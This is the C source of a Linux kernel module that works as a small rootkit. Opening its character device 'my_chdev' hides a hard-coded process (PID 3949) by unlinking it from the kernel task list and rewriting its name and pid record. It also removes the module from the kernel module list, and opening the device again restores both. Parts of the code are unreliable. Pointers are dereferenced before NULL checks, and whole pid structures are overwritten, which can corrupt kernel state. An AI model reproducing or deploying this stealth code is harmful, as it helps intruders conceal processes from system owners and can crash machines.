#include <linux/module.h>
#include <linux/printk.h>
#include <linux/fs.h>
#include <linux/cdev.h>

#define HIDEPID 3949


#define MY_MAJOR        30
#define DEVICE_NAME     "my_chdev"

#define BUF_LEN         1024


void hide_task(pid_t hide_pid);
struct task_struct* find_task_bypid(pid_t hide_pid);
void restore_task(struct task_struct* elected_task, pid_t hide_pid);

int my_open(struct inode* incode, struct file* ptr_file);
void hide_me(void);
void shoh_me(void);


struct task_struct* saved_task;
char saved_task_name[16];
struct pid saved_pid;

struct file_operations my_fops = {
    .open = my_open,
};
struct cdev my_dev;


int init_module(void)
{
    printk(KERN_INFO "Start work\n");
        
    if (register_chrdev_region(MKDEV(MY_MAJOR, 0), 1, DEVICE_NAME) < 0)
    {
        printk(KERN_WARNING "Can't registrate device\n");
        return 0;
    }

    cdev_init(&my_dev, &my_fops);
    if (cdev_add(&my_dev, MKDEV(MY_MAJOR, 0), 1) < 0)
        printk(KERN_WARNING "Can't add device\n");

    return 0;
}

void cleanup_module(void)
{
    cdev_del(&my_dev);
    unregister_chrdev_region(MKDEV(MY_MAJOR, 0), 1);

    printk(KERN_INFO "Name of task %s", saved_task->comm);
    printk(KERN_INFO "Finish work\n");
}


void restore_task(struct task_struct* elected_task, pid_t hide_pid)
{
    struct task_struct *task_prev = NULL, *task_next = NULL;

    pid_t pid_prev = hide_pid - 1;
    pid_t pid_next = hide_pid + 1;
    while ( (task_prev = find_task_bypid(pid_prev)) == NULL )
    {
        pid_prev -= 1;
        if (pid_prev == 0)
            break;
    }

    while ( (task_next = find_task_bypid(pid_next)) == NULL )
    {
        pid_next += 1;
        if (pid_next == PID_MAX_LIMIT)
            break;
    }

    printk(KERN_INFO "Prev process is %s", task_prev->comm);
    printk(KERN_INFO "Next process is %s", task_next->comm);

    if (task_prev == NULL || task_next == NULL)
    {
        printk(KERN_WARNING "Can't find tasks around PID = %d\n", hide_pid);
        return;
    }

    elected_task->tasks.next = &(task_next->tasks);
    elected_task->tasks.prev = &(task_prev->tasks);

    task_prev->tasks.next = &(elected_task->tasks);
    task_next->tasks.prev = &(elected_task->tasks);
    memcpy(elected_task->comm, saved_task_name, 16);

    struct pid* pid = get_task_pid(elected_task, PIDTYPE_PID);
    if (pid != NULL)
    {
        memcpy(pid, &saved_pid, sizeof(struct pid));
        pid->numbers[0].nr = hide_pid;
        printk(KERN_INFO "set PID = %d\n", hide_pid);
    }
}


void hide_task(pid_t hide_pid)
{
    struct task_struct *elected_task = NULL, *task_prev = NULL, *task_next = NULL;
    char new_comm[16] = {0};

    printk(KERN_INFO "Target PID is %d", hide_pid);
    elected_task = find_task_bypid(hide_pid);
    if (elected_task == NULL)
    {
        printk(KERN_WARNING "No such task PID = %d\n", hide_pid);
        return;
    }
    saved_task = elected_task;
    memcpy(saved_task_name, elected_task->comm, 16);

    task_next = list_entry(elected_task->tasks.next, struct task_struct, tasks);
    task_prev = list_entry(elected_task->tasks.prev, struct task_struct, tasks);
    printk(KERN_INFO "Next process is %s", task_next->comm);
    printk(KERN_INFO "Prev process is %s", task_prev->comm);

    memcpy(elected_task->comm, new_comm, 16);

    task_prev->tasks.next = elected_task->tasks.next;
    task_next->tasks.prev = elected_task->tasks.prev;

    elected_task->tasks.next = &(elected_task->tasks);
    elected_task->tasks.prev = &(elected_task->tasks);

    struct pid* pid = get_task_pid(elected_task, PIDTYPE_PID);
    struct pid* pid_next = get_task_pid(task_next, PIDTYPE_PID);
    if (pid != NULL && pid_next != NULL)
    {
        memcpy(&saved_pid, pid, sizeof(struct pid));

        pid->numbers[0].nr = pid_next->numbers[0].nr;
        memcpy(pid->tasks, pid_next->tasks, sizeof(struct hlist_head));
    }
}


struct task_struct* find_task_bypid(pid_t hide_pid)
{
    struct task_struct *task = NULL;
    struct list_head* pos = NULL;

    list_for_each(pos, &current->tasks) {
        task = list_entry(pos, struct task_struct, tasks); 
        if(task->pid == hide_pid) {
            return task;
        }
    }
    return NULL;
}


//------------------------------- HIDING YOURSELF ---------------------

static struct list_head *prev_module;

void hide_me(void)
{
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
}

void shoh_me(void)
{
    list_add(&THIS_MODULE->list, prev_module);
}

int my_open(struct inode* incode, struct file* ptr_file)
{
    static int hide = 0;
    if ( !hide )
    {
        hide_me();
        hide_task(HIDEPID);
        hide = 1;
    } else
    {
        shoh_me();
        restore_task(saved_task, HIDEPID);
        hide = 0;
    }

    return 0;
}


MODULE_LICENSE("GPL");
